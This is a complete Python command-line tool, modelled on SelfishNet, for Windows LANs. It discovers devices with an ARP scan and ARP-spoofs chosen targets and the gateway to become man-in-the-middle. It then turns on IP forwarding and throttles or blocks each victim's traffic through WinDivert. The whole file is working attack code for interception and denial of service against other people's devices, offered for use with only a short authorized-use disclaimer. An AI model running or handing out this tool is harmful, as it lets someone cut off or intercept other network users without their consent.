#!/usr/bin/env python3
"""
SelfishNet CLI - LAN bandwidth control for Windows.

A small, script-based reimplementation of SelfishNet v3's core function:
discover LAN devices, ARP-spoof selected targets to become man-in-the-middle,
and rate-limit or block their traffic per device.

Data path:
  * Scapy + Npcap  -> device discovery and ARP spoofing (layer 2).
  * Windows IP forwarding (kernel) -> keeps spoofed victims online at line rate.
  * WinDivert (pydivert) -> intercepts forwarded packets and applies a per-device
    token bucket: forward while under budget, drop when over. Block = budget 0.

Windows-only. Requires: Npcap installed, `pip install scapy pydivert`, admin rights.

Authorized use only: run this against your own LAN or a network you are
explicitly permitted to test. ARP spoofing is disruptive by design.

Examples:
  # List devices on the LAN and exit
  python selfishnet.py --scan

  # Cap 192.168.1.42 to 500 kbps down / 200 kbps up until Ctrl-C
  python selfishnet.py --limit 192.168.1.42:500:200

  # Cap one device's download only (upload unlimited), block another, for 10 min
  python selfishnet.py --limit 192.168.1.42:500: --block 192.168.1.77 --duration 600
"""

import argparse
import ctypes
import os
import platform
import subprocess
import sys
import threading
import time

# Scapy is required for discovery + spoofing on every code path.
from scapy.all import (
    ARP, Ether, srp, sendp, conf, get_if_addr, get_if_hwaddr, getmacbyip,
)

# pydivert (WinDivert) is only needed when we actually rate-limit. Import lazily
# so `--scan` works even if WinDivert isn't present yet.
try:
    import pydivert
except Exception:  # pragma: no cover - platform/driver dependent
    pydivert = None


# Cap sentinels used throughout: None = unlimited, 0 = block, >0 = kbps.
UNLIMITED = None
BLOCK = 0

# Auto-loaded when no targets are passed on the command line.
DEFAULT_CONFIG = "devices.txt"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def is_admin():
    """True if running elevated (Windows) / as root (fallback)."""
    if platform.system() == "Windows":
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    try:
        import os
        return os.geteuid() == 0
    except Exception:
        return False


def iface_name():
    """Best-effort friendly interface name (e.g. 'Wi-Fi') for netsh."""
    try:
        return conf.iface.name  # scapy NetworkInterface object
    except Exception:
        return str(conf.iface)


def default_gateway():
    """Default gateway IP from the routing table via scapy."""
    try:
        return conf.route.route("0.0.0.0")[2]
    except Exception:
        return None


def local_cidr():
    """Guess the local /24 from this host's IP (good enough for a LAN tool)."""
    ip = get_if_addr(conf.iface)
    if not ip or ip == "0.0.0.0":
        return None
    return ip.rsplit(".", 1)[0] + ".0/24"


def kbps_to_bytes(kbps):
    """Kilobits/sec -> bytes/sec."""
    return kbps * 1000 // 8


def fmt_cap(c):
    """Human-readable cap for logs: unlimited / BLOCK / '500 kbps'."""
    return "unlimited" if c is UNLIMITED else ("BLOCK" if c == BLOCK else f"{c} kbps")


# --------------------------------------------------------------------------- #
# Discovery
# --------------------------------------------------------------------------- #
def scan(cidr, timeout=3):
    """ARP-scan `cidr`, returning a list of (ip, mac) tuples."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
        timeout=timeout, retry=1, verbose=0, iface=conf.iface,
    )
    seen = {}
    for _, reply in ans:
        seen[reply.psrc] = reply.hwsrc
    return sorted(seen.items(), key=lambda kv: tuple(int(o) for o in kv[0].split(".")))


def print_devices(devices, gateway):
    print(f"\n{'IP':<16}{'MAC':<20}{'Note':<10}")
    print("-" * 46)
    for ip, mac in devices:
        note = "gateway" if ip == gateway else ""
        print(f"{ip:<16}{mac:<20}{note:<10}")
    print(f"\n{len(devices)} device(s) found.\n")


# --------------------------------------------------------------------------- #
# Rate limiting
# --------------------------------------------------------------------------- #
class TokenBucket:
    """Classic token bucket. rate<=0 means block (never allow)."""

    def __init__(self, rate_bytes_per_s):
        self.rate = rate_bytes_per_s
        # Allow at least a couple of MTUs of burst so tiny caps still pass
        # single packets and the average stays close to the target rate.
        self.capacity = max(rate_bytes_per_s, 3000)
        self.tokens = float(self.capacity)
        self.last = time.monotonic()

    def allow(self, nbytes):
        if self.rate <= 0:
            return False
        now = time.monotonic()
        self.tokens = min(self.capacity, self.tokens + (now - self.last) * self.rate)
        self.last = now
        if self.tokens >= nbytes:
            self.tokens -= nbytes
            return True
        return False

    def set_rate(self, rate_bytes_per_s):
        """Change the rate in place, keeping current tokens (clamped)."""
        self.rate = rate_bytes_per_s
        self.capacity = max(rate_bytes_per_s, 3000)
        self.tokens = min(self.tokens, self.capacity)


def apply_caps(ip, down_cap, up_cap, down_buckets, up_buckets):
    """Add / update / remove one ip's buckets in place for the given caps."""
    for cap, buckets in ((down_cap, down_buckets), (up_cap, up_buckets)):
        if cap is UNLIMITED:
            buckets.pop(ip, None)
        else:
            rate = kbps_to_bytes(cap) if cap else 0
            if ip in buckets:
                buckets[ip].set_rate(rate)
            else:
                buckets[ip] = TokenBucket(rate)


def build_buckets(targets):
    """
    targets: dict ip -> (down_cap, up_cap) with cap in {None, 0, kbps>0}.
    Returns (down_buckets, up_buckets): ip -> TokenBucket, unlimited omitted.
    """
    down, up = {}, {}
    for ip, (d, u) in targets.items():
        apply_caps(ip, d, u, down, up)
    return down, up


def limiter_loop(down_buckets, up_buckets, stop_event, verbose=False):
    """
    WinDivert forward-layer loop. Traffic *to* a target = download,
    *from* a target = upload. Forward when under budget, else drop.
    """
    if pydivert is None:
        raise RuntimeError(
            "pydivert (WinDivert) is not available. Install it with "
            "`pip install pydivert` on the Windows host."
        )

    # Broad filter so targets added/removed at runtime (live config reload) are
    # honored without reopening the handle. At the forward layer only routed
    # (i.e. spoofed) traffic appears, so this stays cheap; each packet is matched
    # against the live bucket dicts, which the reloader mutates in place.
    dropped = forwarded = 0
    with pydivert.WinDivert("ip", layer=pydivert.Layer.NETWORK_FORWARD) as w:
        for packet in w:
            if stop_event.is_set():
                break
            nbytes = len(packet.raw)
            db = down_buckets.get(packet.dst_addr)   # inbound to victim
            ub = up_buckets.get(packet.src_addr)     # outbound from victim
            allow = True
            if db is not None and not db.allow(nbytes):
                allow = False
            elif ub is not None and not ub.allow(nbytes):
                allow = False
            if allow:
                w.send(packet)
                forwarded += 1
            else:
                dropped += 1
            if verbose and (forwarded + dropped) % 500 == 0:
                print(f"  [limiter] forwarded={forwarded} dropped={dropped}", end="\r")


# --------------------------------------------------------------------------- #
# Spoofing
# --------------------------------------------------------------------------- #
class Spoofer(threading.Thread):
    """Continuously poisons each target <-> gateway until stopped. Targets can
    be added or removed at runtime (used by live config reload)."""

    def __init__(self, targets_macs, gateway_ip, gateway_mac, my_mac, interval=2.0):
        super().__init__(daemon=True)
        self.targets = dict(targets_macs)    # ip -> mac
        self.gw_ip = gateway_ip
        self.gw_mac = gateway_mac
        self.my_mac = my_mac
        self.interval = interval
        self.stop_event = threading.Event()
        self._lock = threading.Lock()

    def _send_arp(self, dst_mac, **arp_fields):
        """Send one ARP reply (op=2) at layer 2 with an explicit Ethernet dst.

        Sending via sendp() with an Ether() layer — rather than L3 send() on a
        bare ARP() — means scapy never has to resolve the destination MAC itself
        (silencing the "is-at" warning) and `iface` actually takes effect."""
        sendp(Ether(dst=dst_mac) / ARP(op=2, **arp_fields),
              verbose=0, iface=conf.iface)

    def _poison(self):
        for ip, mac in list(self.targets.items()):   # snapshot: safe vs reload
            # Tell the victim that the gateway is at our MAC.
            self._send_arp(mac, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.my_mac)
            # Tell the gateway that the victim is at our MAC.
            self._send_arp(self.gw_mac, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=self.my_mac)

    def run(self):
        while not self.stop_event.is_set():
            self._poison()
            self.stop_event.wait(self.interval)

    def add_target(self, ip, mac):
        with self._lock:
            self.targets[ip] = mac

    def remove_target(self, ip):
        with self._lock:
            mac = self.targets.pop(ip, None)
        if mac:
            self._heal(ip, mac)

    def _heal(self, ip, mac, rounds=3):
        """Broadcast the true MAC mappings so this ip <-> gateway recover."""
        for _ in range(rounds):
            self._send_arp(mac, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac)
            self._send_arp(self.gw_mac, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac)
            time.sleep(0.2)

    def restore(self, rounds=4):
        """Heal every current target's ARP cache on shutdown."""
        for _ in range(rounds):
            for ip, mac in list(self.targets.items()):
                self._send_arp(mac, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac)
                self._send_arp(self.gw_mac, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac)
            time.sleep(0.3)


class ConfigWatcher(threading.Thread):
    """Watch the config file and apply adds/removes/cap-changes while running.

    Only file-sourced targets are managed; `pinned` IPs (from CLI flags) are
    never removed or overridden. `applied` (ip -> caps) is the live state,
    mutated in place; `down`/`up` are the same bucket dicts the limiter reads.
    """

    def __init__(self, path, applied, pinned, spoofer, down_buckets, up_buckets,
                 interval=2.0):
        super().__init__(daemon=True)
        self.path = path
        self.applied = applied
        self.pinned = pinned
        self.spoofer = spoofer
        self.down = down_buckets
        self.up = up_buckets
        self.interval = interval
        self.stop_event = threading.Event()
        try:
            self._mtime = os.path.getmtime(path)
        except OSError:
            self._mtime = 0

    def run(self):
        while not self.stop_event.wait(self.interval):
            try:
                mtime = os.path.getmtime(self.path)
            except OSError:
                continue
            if mtime != self._mtime:
                self._mtime = mtime
                self._reload()

    def _reload(self):
        try:
            new = load_config(self.path)
        except ConfigError as e:
            print(f"\n[reload] ignored bad config: {e}")
            return

        # Removals: previously applied, now gone from the file, not CLI-pinned.
        for ip in list(self.applied):
            if ip not in new and ip not in self.pinned:
                self.spoofer.remove_target(ip)       # also heals its ARP cache
                self.down.pop(ip, None)
                self.up.pop(ip, None)
                del self.applied[ip]
                print(f"\n[reload] removed {ip}")

        # Adds / cap changes (CLI-pinned IPs always win, so skip them).
        for ip, (d, u) in new.items():
            if ip in self.pinned:
                continue
            if ip not in self.applied:
                mac = getmacbyip(ip)
                if not mac:
                    print(f"\n[reload] {ip} unreachable; retry on next edit")
                    continue
                self.spoofer.add_target(ip, mac)
                apply_caps(ip, d, u, self.down, self.up)
                self.applied[ip] = (d, u)
                print(f"\n[reload] added {ip}  down={fmt_cap(d)} up={fmt_cap(u)}")
            elif self.applied[ip] != (d, u):
                apply_caps(ip, d, u, self.down, self.up)
                self.applied[ip] = (d, u)
                print(f"\n[reload] updated {ip}  down={fmt_cap(d)} up={fmt_cap(u)}")


# --------------------------------------------------------------------------- #
# Windows IP forwarding
# --------------------------------------------------------------------------- #
def set_forwarding(enable, iface):
    """
    Toggle transit forwarding so the kernel routes victim traffic (and it
    reaches the WinDivert forward layer). Per-interface netsh takes effect
    immediately; the registry key is a fallback that may need a reboot.
    """
    state = "enabled" if enable else "disabled"
    try:
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "interface",
             iface, f"forwarding={state}"],
            check=False, capture_output=True, text=True,
        )
    except FileNotFoundError:
        print("  [forward] netsh not found (are you on Windows?)")
        return
    print(f"  [forward] interface '{iface}' forwarding={state}")


# --------------------------------------------------------------------------- #
# CLI parsing
# --------------------------------------------------------------------------- #
def cap_from_str(v):
    """A single rate field -> UNLIMITED / BLOCK / kbps int. Raises ValueError."""
    v = v.strip().lower()
    if v in ("", "-", "*", "unlimited", "none"):
        return UNLIMITED
    n = int(v)  # ValueError on junk
    if n < 0:
        raise ValueError(f"negative rate '{v}'")
    return BLOCK if n == 0 else n


def parse_limit(spec):
    """'IP:DOWN:UP' -> (ip, down, up). Empty field = unlimited, 0 = block."""
    parts = spec.split(":")
    if len(parts) != 3:
        raise argparse.ArgumentTypeError(
            f"--limit must be IP:DOWN:UP (kbps), got '{spec}'")
    ip, d, u = parts
    try:
        return ip, cap_from_str(d), cap_from_str(u)
    except ValueError as e:
        raise argparse.ArgumentTypeError(f"{e} in '{spec}'")


class ConfigError(Exception):
    """Raised when a device-list file can't be parsed."""


def load_config(path):
    """
    Parse a devices file into {ip: (down_cap, up_cap)}.

    One device per line:
        IP  DOWN  UP     (kbps; number=cap, 0=block dir, -/*/blank=unlimited)
        IP  block        (block the device entirely)
    '#' starts a comment; spaces, commas, or colons separate fields.
    Raises ConfigError on a bad file so callers can decide whether to abort
    (startup) or ignore the edit (live reload).
    """
    targets = {}
    try:
        fh = open(path, "r", encoding="utf-8")
    except OSError as e:
        raise ConfigError(f"could not read '{path}': {e}")
    with fh:
        for lineno, raw in enumerate(fh, 1):
            line = raw.split("#", 1)[0].strip()
            if not line:
                continue
            tokens = line.replace(",", " ").replace(":", " ").split()
            ip = tokens[0]
            try:
                if len(tokens) >= 2 and tokens[1].lower() == "block":
                    down = up = BLOCK
                else:
                    down = cap_from_str(tokens[1]) if len(tokens) >= 2 else UNLIMITED
                    up = cap_from_str(tokens[2]) if len(tokens) >= 3 else UNLIMITED
            except ValueError as e:
                raise ConfigError(f"{path}:{lineno}: {e}")
            targets[ip] = (down, up)
    if not targets:
        raise ConfigError(f"no devices found in '{path}'")
    return targets


def build_parser():
    p = argparse.ArgumentParser(
        description="SelfishNet CLI - LAN bandwidth control (Windows).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--scan", action="store_true", help="scan the LAN and exit")
    p.add_argument("--range", dest="cidr", help="scan range CIDR (default: local /24)")
    p.add_argument("--iface", help="interface friendly name for netsh (e.g. 'Wi-Fi')")
    p.add_argument("--gateway", help="override gateway IP (default: auto)")
    p.add_argument("--limit", dest="limits", action="append", type=parse_limit,
                   default=[], metavar="IP:DOWN:UP",
                   help="rate-limit a device, kbps; empty field=unlimited, 0=block")
    p.add_argument("--block", dest="blocks", action="append", default=[],
                   metavar="IP", help="block a device entirely (repeatable)")
    p.add_argument("-c", "--config", metavar="FILE",
                   help="read targets from a file (IP DOWN UP per line, kbps)")
    p.add_argument("--duration", type=int, help="auto-stop after N seconds")
    p.add_argument("--no-forward", action="store_true",
                   help="don't toggle Windows IP forwarding (do it yourself)")
    p.add_argument("-v", "--verbose", action="store_true", help="live counters")
    return p


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def run_session(targets, args, gateway, config_path=None, pinned=None):
    """Resolve MACs, enable forwarding, spoof, run the limiter, and (when a
    config file is in use) watch it so edits apply live."""
    pinned = set(pinned or ())
    my_mac = get_if_hwaddr(conf.iface)
    gw_mac = getmacbyip(gateway)
    if not gw_mac:
        sys.exit(f"Could not resolve gateway MAC for {gateway}. Is it reachable?")

    target_macs = {}
    for ip in targets:
        mac = getmacbyip(ip)
        if not mac:
            print(f"  [warn] could not resolve MAC for {ip}; skipping")
            continue
        target_macs[ip] = mac
    if not target_macs:
        sys.exit("No resolvable targets. Nothing to do.")

    targets = {ip: caps for ip, caps in targets.items() if ip in target_macs}
    down_buckets, up_buckets = build_buckets(targets)

    print(f"\nGateway: {gateway} ({gw_mac})   You: {get_if_addr(conf.iface)} ({my_mac})")
    for ip, (d, u) in targets.items():
        print(f"  target {ip:<15} down={fmt_cap(d):<12} up={fmt_cap(u)}")

    iface = args.iface or iface_name()
    if not args.no_forward:
        set_forwarding(True, iface)

    spoofer = Spoofer(target_macs, gateway, gw_mac, my_mac)
    stop_event = threading.Event()
    spoofer.start()

    watcher = None
    if config_path:
        watcher = ConfigWatcher(config_path, dict(targets), pinned, spoofer,
                                down_buckets, up_buckets)
        watcher.start()
        print(f"Watching {config_path} for changes (edits apply live).")

    print("\nSpoofing + limiting. Press Ctrl-C to stop and restore.\n")

    if args.duration:
        threading.Timer(args.duration, stop_event.set).start()

    try:
        limiter_loop(down_buckets, up_buckets, stop_event, verbose=args.verbose)
    except KeyboardInterrupt:
        pass
    finally:
        print("\nRestoring network...")
        stop_event.set()
        if watcher:
            watcher.stop_event.set()
        spoofer.stop_event.set()
        spoofer.restore()
        if not args.no_forward:
            set_forwarding(False, iface)
        print("Done.")


def main():
    args = build_parser().parse_args()

    if args.iface:
        conf.iface = args.iface

    if args.scan:
        cidr = args.cidr or local_cidr()
        if not cidr:
            sys.exit("Could not determine local subnet; pass --range CIDR.")
        print(f"Scanning {cidr} ...")
        print_devices(scan(cidr), args.gateway or default_gateway())
        return

    # If no targets were given anywhere, fall back to a devices.txt in the
    # current folder or next to the script -- so a plain `python selfishnet.py`
    # "just works" once you've created the file.
    config_path = args.config
    if config_path is None and not args.limits and not args.blocks:
        for cand in (DEFAULT_CONFIG, os.path.join(SCRIPT_DIR, DEFAULT_CONFIG)):
            if os.path.isfile(cand):
                config_path = cand
                print(f"No targets given; using device list: {cand}")
                break

    if not args.limits and not args.blocks and not config_path:
        build_parser().print_help()
        sys.exit("\nNothing to do: create a devices.txt, or pass "
                 "--scan / --limit / --block / --config.")

    if not is_admin():
        sys.exit("Administrator privileges required (Npcap + WinDivert need a driver).")

    gateway = args.gateway or default_gateway()
    if not gateway:
        sys.exit("Could not determine gateway; pass --gateway IP.")

    # Merge config file first, then CLI flags (which override and are "pinned"
    # so live reload never removes them).
    targets, pinned = {}, set()
    if config_path:
        try:
            targets.update(load_config(config_path))
        except ConfigError as e:
            sys.exit(str(e))
    for ip, d, u in args.limits:
        targets[ip] = (d, u)
        pinned.add(ip)
    for ip in args.blocks:
        targets[ip] = (BLOCK, BLOCK)
        pinned.add(ip)

    run_session(targets, args, gateway, config_path=config_path, pinned=pinned)


if __name__ == "__main__":
    main()
